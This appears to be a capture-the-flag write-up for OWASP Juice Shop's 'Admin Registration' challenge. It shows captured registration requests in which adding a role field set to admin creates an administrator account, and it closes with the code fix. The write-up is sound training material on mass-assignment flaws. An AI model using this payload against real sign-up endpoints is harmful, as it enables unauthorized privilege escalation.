# Admin Registration
**Description**
Register as a user with administrator privileges.

Style: With Coding Challenge
Topic: Improper Input Validation

## Solution
### Web Solution
First, let log in as `admin@juice-sh.op` and inspect the `JWT` we have...

The jwt payload (decoded) contains an interesting value, a key named `rule` with value `admin`.

This is what we want to achieve.

Went to user-registration and register a mock user.

Saw the following request (via `burp`)
```python
POST /api/Users/ HTTP/1.1
...
Connection: keep-alive

{
  "email":"test1@test.com",
  "password":"12345",
  "passwordRepeat":"12345",
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2026-06-13T08:35:55.871Z",
    "updatedAt":"2026-06-13T08:35:55.871Z"
  },
  "securityAnswer":"1"
}
```
Ok and the response was `201 Created` and contained
```python
{
  "status":"success",
  "data":{
    "username":"",
    "role":"customer",
    "deluxeToken":"",
    "lastLoginIp":"0.0.0.0",
    "profileImage":"/assets/public/images/uploads/default.svg",
    "isActive":true,
    "id":25,
    "email":"test1@test.com",
    "updatedAt":"2026-06-13T10:17:20.126Z",
    "createdAt":"2026-06-13T10:17:20.126Z",
    "deletedAt":null
  }
}
```

Tried adding *"role":"admin"* to the request this time!

Sent this
```json
{
  "email":"test2@test.com",
  "role":"admin",
  "password":"12345",
  "passwordRepeat":"12345",
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2026-06-13T08:35:55.871Z",
    "updatedAt":"2026-06-13T08:35:55.871Z"
  },
  "securityAnswer":"1"
}
```

Received this
```json
{
  "status":"success",
  "data":{
    "username":"",
    "deluxeToken":"",
    "lastLoginIp":"0.0.0.0",
    "profileImage":"/assets/public/images/uploads/defaultAdmin.png",
    "isActive":true,
    "id":26,
    "email":"test2@test.com",
    "role":"admin",
    "updatedAt":"2026-06-13T10:19:34.400Z",
    "createdAt":"2026-06-13T10:19:34.400Z",
    "deletedAt":null
  }
}
```

### Coding Challenge

The vulnerable line is the 32, it's initialize the user context object fomr the request.

The fix is hardcoding the `context.instance.role = 'customer'` line!